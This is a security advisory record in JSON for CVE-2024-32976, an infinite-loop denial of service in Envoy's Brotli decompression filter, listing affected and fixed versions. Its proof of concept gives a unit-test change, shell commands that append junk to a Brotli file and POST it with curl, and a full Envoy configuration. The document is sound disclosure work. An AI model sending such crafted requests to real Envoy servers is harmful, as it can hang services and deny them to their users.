{
  "modified": "2024-06-04T19:39:19Z",
  "published": "2024-06-04T19:39:19Z",
  "schema_version": "1.5.0",
  "id": "CVE-2024-32976",
  "aliases": [
    "GHSA-7wp5-c2vq-4f8m"
  ],
  "details": "### Summary\r\nEnvoyproxy with a Brotli filter can get into an endless loop during decompression of Brotli data with extra input.\r\n\r\n### Details\r\nThe `decompress` method will keep processing the data as long as there is available input.\r\n\r\nOnce the original compressed data (up to the extra input) is decoded, additional calls to the Brotli lib will not trigger an error and will keep the available data unchanged, and causing an infinite loop.\r\n\r\nA reference to how this use case was handled in the brotli cli tool, can be found here:\r\nhttps://github.com/google/brotli/blob/adbc354d23af714a557730cc0e15fc38909e4ef0/c/tools/brotli.c#L1253\r\n\r\n### PoC\r\nTo reproduce using an existing unit test `BrotliDecompressorImplTest.CompressAndDecompress`\r\nhttps://github.com/envoyproxy/envoy/blob/9b01aaf6ed62948649b192f2bc4b5eee79af35c5/test/extensions/compression/brotli/decompressor/brotli_decompressor_impl_test.cc#L82\r\nAfter the line:\r\n```c++\r\naccumulation_buffer.add(buffer);`\r\n```\r\n\r\nAdd the line:\r\n```c++\r\naccumulation_buffer.add(\"ABCDE\");\r\n```\r\n\r\nTo reproduce with a running envoyproxy, use the configuration below that is set to decompress requests to localhost:10000 and forward them to httpbin.org.\r\n\r\nNote that the configuration also includes a buffer filter as recommended here: https://www.envoyproxy.io/docs/envoy/latest/configuration/http/http_filters/decompressor_filter\r\n\r\n- Compress a file with brotli: \r\n  ```console\r\n  $ brotli file.json -o file.json.br\r\n  ```\r\n- Verify you are able to send the data in the file to the server.\r\n  ```console\r\n  $ curl -d \"@file.json.br\" -H \"Content-Type: application/json\"  -H \"Content-Encoding: br\" -X POST localhost:10000/anything\r\n  ```\r\n- Append data to the end of the file.\r\n  ```console\r\n  echo \"12345\" \u003e\u003e file.json.br\r\n  ```\r\n- See that local decompression is failing on the new file.\r\n  ```console\r\n  brotli -d file.json.br\r\n  \u003e\u003ecorrupt input [file.json.br] \r\n  ```\r\n- Try to send the new data to the server\r\n  ```console\r\n  curl -d \"@file.json.br\" -H \"Content-Type: application/json\"  -H \"Content-Encoding: br\" -X POST localhost:10000/anything\r\n  ```\r\n- The curl request should now be stuck!\r\n\r\n\r\n#### Envoyproxy Configuration:\r\n```yaml\r\nstatic_resources:\r\n  listeners:\r\n  - address:\r\n      socket_address:\r\n        address: 0.0.0.0\r\n        port_value: 10000\r\n    filter_chains:\r\n    - filters:\r\n      - name: envoy.http_connection_manager\r\n        typed_config:\r\n          \"@type\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\r\n          codec_type: AUTO\r\n          stat_prefix: ingress_http\r\n          route_config:\r\n            name: local_route\r\n            virtual_hosts:\r\n            - name: local_service\r\n              domains: [\"*\"]\r\n              routes:\r\n              - match: { prefix: \"/\" }\r\n                route:\r\n                  cluster: httpbin_cluster\r\n          http_filters:\r\n          - name: envoy.filters.http.decompressor\r\n            typed_config:\r\n              \"@type\": type.googleapis.com/envoy.extensions.filters.http.decompressor.v3.Decompressor\r\n              decompressor_library:\r\n                name: brotli\r\n                typed_config:\r\n                  \"@type\": type.googleapis.com/envoy.extensions.compression.brotli.decompressor.v3.Brotli\r\n          - name: envoy.filters.http.buffer\r\n            typed_config:\r\n              \"@type\": type.googleapis.com/envoy.extensions.filters.http.buffer.v3.Buffer\r\n              max_request_bytes: 5242880\r\n          - name: envoy.router\r\n            typed_config:\r\n              \"@type\": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router\r\n  clusters:\r\n  - name: httpbin_cluster\r\n    connect_timeout: 0.25s\r\n    type: STRICT_DNS\r\n    lb_policy: ROUND_ROBIN\r\n    load_assignment:\r\n      cluster_name: httpbin_cluster\r\n      endpoints:\r\n      - lb_endpoints:\r\n        - endpoint:\r\n            address:\r\n              socket_address:\r\n                address: httpbin.org\r\n                port_value: 80\r\n```\r\n\r\n### Impact\r\n\r\nThe above can easily be used as a DOS/DDOS attack on any EnvoyProxy server that uses the Brotli filter.\r\n\r\n### Mitigation\r\n\r\nAvoid use of brotli filter or update to version with fixes",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "envoy",
        "purl": "pkg:dhi/envoy"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.18.0"
            },
            {
              "fixed": "1.27.6"
            },
            {
              "introduced": "1.28.0"
            },
            {
              "fixed": "1.28.4"
            },
            {
              "introduced": "1.29.0"
            },
            {
              "fixed": "1.29.5"
            },
            {
              "introduced": "1.30.0"
            },
            {
              "fixed": "1.30.2"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "envoyproxy",
        "source_package": "brotli_decompressor_impl.cc"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-7wp5-c2vq-4f8m"
    }
  ]
}